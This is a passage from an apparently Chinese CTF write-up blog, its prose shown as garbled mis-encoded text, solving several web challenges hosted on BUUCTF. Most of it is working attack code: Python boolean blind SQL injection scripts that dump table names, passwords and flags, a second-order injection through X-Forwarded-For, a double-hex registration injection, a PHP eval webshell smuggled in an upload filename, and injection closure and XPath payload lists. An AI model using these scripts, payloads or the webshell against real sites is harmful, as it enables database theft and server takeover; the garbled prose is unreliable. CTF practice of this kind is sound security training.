class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">&quot;./&quot;</span> . $row[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>
<p>åŸºæœ¬æ€è·¯ï¼š<strong>boolç›²æ³¨ï¼Œè¯­å¥æˆåŠŸçš„è¯ï¼Œå°±è®©id = 1ï¼Œå›æ˜¾æ­£å¸¸ï¼Œé”™è¯¯çš„è¯ id = 0ï¼Œå°±ä»€ä¹ˆéƒ½æ²¡æœ‰</strong>ã€‚</p>
<p>å•å¼•å·é€ƒé€¸çš„æ–¹æ³•æ˜¯ç”¨<code>\0</code>æ¥è½¬ä¹‰æ‰å®ƒçš„å•å¼•å·ã€‚è¾“å…¥<code>\0</code>ï¼Œç»è¿‡<code>addslashes</code>å‡½æ•°ä¼šå…ˆå˜æˆ<code>\\0</code>,ç„¶åç»è¿‡â€œstr_replaceâ€å‡½æ•°ï¼Œä¼šå˜æˆ<code>\</code>,è¿™æ ·ï¼Œå°±æŠŠidåé¢çš„å•å¼•å·ç»™è½¬ä¹‰äº†ã€‚</p>
<p>SQLç›²æ³¨è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://143e2c2b-3448-4468-aeee-95cd35c73be0.node3.buuoj.cn/image.php?id=\\0&amp;path=&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;or id=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;or id=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;or id=if(ascii(substr((select username from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span></span><br><span class="line">payload = <span class="string">&quot;or id=if(ascii(substr((select password from users),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;</span></span><br><span class="line">flag = <span class="string">&quot;JFIF&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) &gt;&gt; <span class="number">1</span></span><br><span class="line">        response = requests.get(url + payload.format(i, mid))</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<p>ç™»å½•åæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œç»è¿‡æµ‹è¯•åå¯ä»¥å‘ç°ï¼Œ<code>upload.php</code>æŠŠä¸Šä¼ çš„æ–‡ä»¶åå†™å…¥äº†ä¸€ä¸ªphpæ–‡ä»¶åç¼€çš„æ—¥å¿—æ–‡ä»¶ï¼Œå¹¶ä¸”è·¯å¾„å·²çŸ¥ã€‚ä½†æ˜¯æ–‡ä»¶åä¼šè¿‡æ»¤phpï¼Œå¯ä»¥ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename&#x3D;&lt;?&#x3D;@eval($_POST[&#39;a&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
<p>ç„¶åèšå‰‘ç›´æ¥è¿æ¥ã€‚</p>
<h2 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢">WUSTCTF2020 é¢œå€¼æˆç»©æŸ¥è¯¢</h2>
<h3 id="è€ƒç‚¹-v17">è€ƒç‚¹</h3>
<ul>
<li>MySQLç›²æ³¨</li>
</ul>
<h3 id="è§£é¢˜-v16">è§£é¢˜</h3>
<p>æ¯”è¾ƒæ˜æ˜¾çš„GETå‹çš„SQLæ³¨å…¥ï¼ŒFUZZä¸€ä¸‹</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708105750.png" style="zoom:50%;" />
<p>å‘ç°å¥½åƒæ˜¯å¯ä»¥ç›´æ¥æ‰§è¡ŒSQLè¯­å¥ï¼ŒéªŒè¯ä¸€ä¸‹</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708105954.png" alt=""></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯ç›´æ¥å†™ç›²æ³¨è„šæœ¬äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a55db98c-72b1-40e8-b771-61b1bc60cd9d.node3.buuoj.cn/?stunum=&quot;</span></span><br><span class="line">flag = <span class="string">&quot;Hi admin, your score is: 100&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;ctf&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(group_concat(flag,0x3a,value))from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)&quot;</span></span><br><span class="line">        response = requests.post(url+payload.format(i, mid))</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<h3 id="æ‹“å±•">æ‹“å±•</h3>
<p>æˆ‘ä»¬å†å¹æ¯›æ±‚ç–µä¸€ç‚¹ï¼Œä¸Šä¸€ä¸ªè„šæœ¬è·‘å‡ºæ¥çš„flagéƒ½æ˜¯å¤§å†™å­—æ¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥å¦‚ä½•åŒºåˆ†å¤§å°å†™å‘¢ã€‚</p>
<p>å‚è€ƒä¸­çš„ç¬¬äºŒç¯‡æ–‡ç« å·²ç»å‘Šè¯‰äº†æˆ‘ä»¬ç­”æ¡ˆï¼Œæƒ³åŠæ³•æŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºäºŒè¿›åˆ¶åï¼Œè¿›è¡Œå­—èŠ‚å¯¹å­—èŠ‚çš„æ¯”è¾ƒã€‚ä½†æ˜¯å‡½æ•°<code>BINARY</code>ä¸­çš„<code>in</code>è¢«ç¦æ‰äº†ï¼Œä½œè€…åˆå‘ç°äº†ä¸€ç§æ€è·¯ï¼Œå½“ä¸€ä¸ªå­—ç¬¦ä¸²è¿æ¥ä¸€ä¸ªäºŒè¿›åˆ¶çš„å€¼æ—¶<code>CONCAT(&quot;aa&quot;, BINARY(&quot;BB&quot;))</code>ï¼Œå…¶å¾—åˆ°çš„ä¹Ÿå°†æ˜¯äºŒè¿›åˆ¶ã€‚</p>
<p>å¹¶ä¸”MySQLä¸­çš„JSONå¯¹è±¡æ˜¯äºŒè¿›åˆ¶å¯¹è±¡ï¼Œå› æ­¤ï¼Œ<code>CAST(0 AS JSON)</code>ä¼šè¿”å›ä¸€ä¸ªäºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œè¿›è€Œ<code>SELECT CONCAT(â€œAâ€, CAST(0 AS JSON))</code>ä¹Ÿä¼šè¿”å›ä¸€ä¸ªäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬çœ‹ä¸€çœ‹ä¸‹é¢è¿™ä¸ªpayloadèƒ½å¦å¯è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2||(select 1,concat(&#39;&#123;&#125;&#39;,cast(&#39;0&#39; as json)))&gt;(select * from f1ag_1s_h3r3_hhhhh)</span><br></pre></td></tr></table></figure>
<p>è¿”å›äº†errorã€‚æˆ‘çŒœåº”è¯¥æ˜¯ç‰ˆæœ¬çš„é—®é¢˜ï¼Œç”¨ç¬¬ä¸€ä¸ªç›²æ³¨è„šæœ¬æŸ¥çœ‹ä¸€ä¸‹version()ï¼Œå‘ç°æ˜¯MariaDB 10.2.26ã€‚</p>
<p>æŸ¥è¯¢ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£ï¼ŒMariaDBåœ¨10.2.7æ‰åŠ å…¥äº†JSONæ•°æ®ç±»å‹ã€‚</p>
<p>æ— æœã€‚</p>
<h3 id="å‚è€ƒ">å‚è€ƒ</h3>
<p><a href="https://www.gem-love.com/ctf/1782.html">https://www.gem-love.com/ctf/1782.html</a></p>
<p><a href="https://nosec.org/home/detail/3830.html">https://nosec.org/home/detail/3830.html</a></p>
<h2 id="RoarCTF2019-Online-Proxy">RoarCTF2019 Online Proxy</h2>
<h3 id="è€ƒç‚¹-v18">è€ƒç‚¹</h3>
<ul>
<li>XFFæ³¨å…¥</li>
<li>äºŒæ¬¡æ³¨å…¥</li>
<li>ç›²æ³¨</li>
</ul>
<h3 id="é¢˜è§£-v2">é¢˜è§£</h3>
<p>è¿™é“é¢˜çš„æ³¨å…¥ç‚¹åœ¨X-Forwarded-Forï¼Œåˆ©ç”¨XFFæ¥æ›´æ”¹IPåœ°å€ï¼Œå¯ä»¥å‘ç°IPè¢«ä¿å­˜å¹¶è¾“å‡ºäº†ã€‚</p>
<p>æ—¢ç„¶ä»–çš„last-ipå’Œcurrent-ipä¼šæ›´æ–°ï¼Œç”±æ­¤å¯ä»¥çŒœæƒ³ä»–ä¸æ•°æ®åº“è¿›è¡Œäº†äº¤äº’</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (<span class="keyword">current</span>-ip,<span class="keyword">last</span>-ip ) <span class="keyword">VALUES</span> (<span class="string">&#x27;$current-ip&#x27;</span>,<span class="string">&#x27;$last-ip&#x27;</span> );</span><br></pre></td></tr></table></figure>
<p>ç”±äºè¿™é¢˜æœ‰å›æ˜¾ï¼Œå› æ­¤ï¼Œå¯ä»¥è€ƒè™‘äºŒæ¬¡æ³¨å…¥ã€‚</p>
<p>é¦–å…ˆç”¨ä¸‹é¢è¿™ä¸ªpayloadéªŒè¯ä¸€ä¸‹èƒ½ä¸èƒ½æˆåŠŸåœ°é—­åˆè¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#39; or ascii(substr((select(database())),1,1))&gt;100 or &#39;0</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721181214.png" alt=""></p>
<p>å†éšä¾¿è¾“å…¥</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721181937.png" alt=""></p>
<p>å†æ¬¡å‘é€è¯·æ±‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721182026.png" alt=""></p>
<p>éªŒè¯æˆåŠŸï¼Œæ¥ä¸‹æ¥å°±æ˜¯å†™ç›²æ³¨è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node3.buuoj.cn:29354/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™ä¸ªheadå¤´å¥½åƒå¿…é¡»åŠ cookie</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">&quot;X-Forwarded-For&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;track_uuid=60661451-cdab-4a74-95b4-74d6a66945a9&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># #æŸ¥åº“å</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># #æŸ¥è¡¨å</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;F4l9_D4t4B45e&#x27;)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># #æŸ¥åˆ—å</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F4l9_t4b1e&#x27;)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥flag</span></span><br><span class="line">payload = <span class="string">&quot;0&#x27; or ascii(substr((select(group_concat(F4l9_C01uMn))from(F4l9_D4t4B45e.F4l9_t4b1e)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">137</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;æ’å…¥sqlè¯­å¥&#x27;&#x27;&#x27;</span></span><br><span class="line">        payload1 = payload.format(i, mid)</span><br><span class="line">        head[<span class="string">&quot;X-Forwarded-For&quot;</span>] = payload1</span><br><span class="line">        requests.get(url, headers=head)</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;é‡æ–°å‘é€ä¸¤æ¬¡è¯·æ±‚&#x27;&#x27;&#x27;</span></span><br><span class="line">        head[<span class="string">&quot;X-Forwarded-For&quot;</span>] = <span class="string">&quot;penson&quot;</span></span><br><span class="line">        requests.get(url, headers=head)</span><br><span class="line">        r = requests.get(url, headers=head)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Last Ip: 1 &quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<h3 id="æ‹“å±•-v2">æ‹“å±•</h3>
<p>æ›´å¤šçš„é—­åˆæ–¹å¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; or (payload) or &#39;</span><br><span class="line">&#39; and (payload) and &#39;</span><br><span class="line">&#39; or (payload) and &#39;</span><br><span class="line">&#39; or (payload) and &#39;&#x3D;&#39;</span><br><span class="line">&#39;* (payload) *&#39;</span><br><span class="line">&#39; or (payload) and &#39;</span><br><span class="line">&quot; â€“ (payload) â€“ &quot;</span><br></pre></td></tr></table></figure>
<p>è¿˜æœ‰ä¸€ç§payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#39;+conv(hex(substr((select database()),1,5)),16,10)+&#39;0</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ï¼šä¸€æ¬¡ä¸èƒ½è¯»å¤ªå¤šä½ï¼Œä¸ç„¶10è¿›åˆ¶ä¼šç”¨ç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºï¼Œå°±æ— æ³•è½¬æ¢å›åŸå­—ç¬¦ä¸²äº†ã€‚</p>
<h2 id="ç½‘é¼æ¯2018-Unfinished">ç½‘é¼æ¯2018 Unfinished</h2>
<h3 id="è€ƒç‚¹-v19">è€ƒç‚¹</h3>
<ul>
<li>äºŒæ¬¡æ³¨å…¥</li>
<li>ä¸¤æ¬¡Hexç¼–ç </li>
</ul>
<h3 id="è§£é¢˜-v17">è§£é¢˜</h3>
<p>ç™»é™†çš„æ—¶å€™ç”¨åˆ°çš„æ˜¯é‚®ç®±å’Œå¯†ç ï¼Œè€Œæ³¨å†Œçš„æ—¶å€™è¿˜æœ‰ä¸€ä¸ªç”¨æˆ·åï¼Œè€Œè¿™ä¸ªç”¨æˆ·åå´åœ¨ç™»é™†åæ˜¾ç¤ºäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ç”¨æˆ·åè¿™é‡Œå¯èƒ½å­˜åœ¨ <strong>äºŒæ¬¡æ³¨å…¥</strong>ã€‚</p>
<p>æ³¨å†ŒæˆåŠŸï¼Œä¼šå¾—åˆ° <strong>302</strong> çŠ¶æ€ç å¹¶è·³è½¬è‡³ <strong>login.php</strong> ï¼›å¦‚æœæ³¨å†Œå¤±è´¥ï¼Œåªä¼šè¿”å› <strong>200</strong> çŠ¶æ€ç ã€‚æ‰€ä»¥æ„é€  <strong>payload</strong> å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">email&#x3D;test@666.com&amp;username&#x3D;0&#39;%2B(select hex(hex(database())))%2B&#39;0&amp;password&#x3D;test</span><br></pre></td></tr></table></figure>
<p>åœ¨è¿™é‡Œè§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆè¦ä¸¤æ¬¡hexåŠ å¯†ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721213306.png" alt=""></p>
<p>ä¸Šé¢è¿™å¼ å›¾å±•ç¤ºçš„æ˜¯ï¼Œå¦‚æœå­—ç¬¦ä¸²hexåçš„å€¼ä¸­åŒ…å«å­—æ¯ï¼Œåœ¨ä¸0ç›¸åŠ ååªèƒ½æ˜¾ç¤ºå­—æ¯ä¹‹å‰çš„æ•°å­—ä¸0ç›¸åŠ çš„ç»“æœã€‚ä¸¤æ¬¡hexç¼–ç å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721214124.png" alt=""></p>
<p>ç„¶åè¿™é‡Œè¿˜è¦æ³¨æ„ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å½“æ•°æ®è¿›è¿‡ <strong>ä¸¤æ¬¡hex</strong> åï¼Œä¼šå¾—åˆ°è¾ƒé•¿çš„ä¸€ä¸²åªå«æœ‰æ•°å­—çš„å­—ç¬¦ä¸²ï¼Œå½“è¿™ä¸ªé•¿å­—ç¬¦ä¸²è½¬æˆæ•°å­—å‹æ•°æ®çš„æ—¶å€™ä¼šå˜æˆç§‘å­¦è®¡æ•°æ³•ï¼Œå°±æ— æ³•è¿˜åŸæœ¬èº«çš„å­—ç¬¦ä¸²ã€‚</p>
<p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ substr æ¯æ¬¡å–10ä¸ªå­—ç¬¦é•¿åº¦ä¸ â€˜0â€™ ç›¸åŠ ï¼Œè¿™æ ·å°±ä¸ä¼šä¸¢å¤±æ•°æ®ã€‚ä½†æ˜¯è¿™é‡Œä½¿ç”¨é€—å· <strong>,</strong> ä¼šå‡ºé”™ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ç±»ä¼¼ substr(â€˜testâ€™ from 1 for 10) è¿™ç§å†™æ³•æ¥ç»•è¿‡ï¼Œå…·ä½“è·å– <strong>flag</strong> çš„payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#39;%2b(select substr(hex(hex((select * from flag))) from 1 for 10))%2b&#39;0</span><br></pre></td></tr></table></figure>
<p>æ³¨å…¥è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re, binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7fb57b69-428d-4c33-8988-d08449ffb183.node3.buuoj.cn/&quot;</span></span><br><span class="line">sql = <span class="string">&quot;select * from flag&quot;</span></span><br><span class="line"></span><br><span class="line">email = [<span class="string">&quot;test0&quot;</span> + str(i) + <span class="string">&quot;@aa.aa&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">24</span>)]  <span class="comment"># è¿™é‡Œæ¬¡æ•°å¯ä»¥é€šè¿‡sqlçˆ†ç ´flagé•¿åº¦å¾—åˆ°ï¼Œæˆ–è€…ä¹Ÿå¯fuzz</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params">email, offset</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;0&#x27;+(select substr(hex(hex((&#123;0&#125;))) from &#123;1&#125; for 10))+&#x27;0&quot;</span>.format(sql, str(<span class="number">1</span> + offset * <span class="number">10</span>))</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: email,</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req = requests.post(url + <span class="string">&quot;/register.php&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">email</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: email,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url + <span class="string">&quot;/login.php&quot;</span>, data, allow_redirects=<span class="literal">True</span>)</span><br><span class="line">    pattern = <span class="string">&#x27;&lt;span class=\&quot;user-name\&quot;&gt;\s*(\d&#123;1,10&#125;)\s*&lt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> re.findall(pattern, r.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    raw = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> email, offset <span class="keyword">in</span> zip(email, range(<span class="number">0</span>, len(email))):</span><br><span class="line">        register(email, offset)</span><br><span class="line">        test = login(email)</span><br><span class="line">        print(test)</span><br><span class="line">        raw += test</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;[-] Double Hex : -&gt; %s &lt;-\r&quot;</span> % (raw))</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;[+] Double Hex : -&gt; &#123;&#125; &lt;-&quot;</span>.format(raw))</span><br></pre></td></tr></table></figure>
<h2 id="BlackWatch-å…¥ç¾¤é¢˜-Web">BlackWatch å…¥ç¾¤é¢˜ Web</h2>
<h3 id="è€ƒç‚¹-v20">è€ƒç‚¹</h3>
<ul>
<li>MySQLç›²æ³¨</li>
</ul>
<h3 id="è§£é¢˜-v18">è§£é¢˜</h3>
<p>ç›²æ³¨è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0b5ee7e6-71d1-4280-9dd3-6e27f0650b68.node3.buuoj.cn/backend/content_detail.php?id=&quot;</span></span><br><span class="line">proxies = &#123; <span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">name = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = head + tail &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = &quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d,3,2)&quot; % (i, mid)</span></span><br><span class="line">        <span class="comment"># payload = &quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;contents&#x27;)),%d,1))&gt;%d,3,2)&quot; % (i, mid)</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(group_concat(password))from(admin)),%d,1))&gt;%d,3,2)&quot;</span> % (i, mid)</span><br><span class="line"></span><br><span class="line">        r = requests.get(url + payload, proxies=proxies)</span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line">        <span class="comment"># print(r.json())</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Yunen&quot;</span> <span class="keyword">in</span> str(r.json()):</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        name += chr(head)</span><br><span class="line">        print(name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h2 id="NPUCTF2020-ezlogin">NPUCTF2020 ezlogin</h2>
<h3 id="è€ƒç‚¹-v21">è€ƒç‚¹</h3>
<ul>
<li><a href="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">Xpathæ³¨å…¥</a></li>
</ul>
<h3 id="è§£é¢˜-v19">è§£é¢˜</h3>
<table>
<thead>
<tr>
<th>payload</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>â€™ or count(/)=1 or '1</td>
<td>åˆ¤æ–­æœ‰å‡ ä¸ªæ ¹èŠ‚ç‚¹</td>
</tr>
<tr>
<td>â€™ or string-count(name(/*[1]))=1 or '1</td>
<td>è·å–æ ¹èŠ‚ç‚¹é•¿åº¦</td>
</tr>
<tr>
<td>'or substring(name(/*[1]), 1, 1)=â€˜aâ€™ or '1</td>
<td>è·å–å†…å®¹</td>
</tr>
</tbody>
</table>
<p>ç›²æ³¨è„šæœ¬</p>
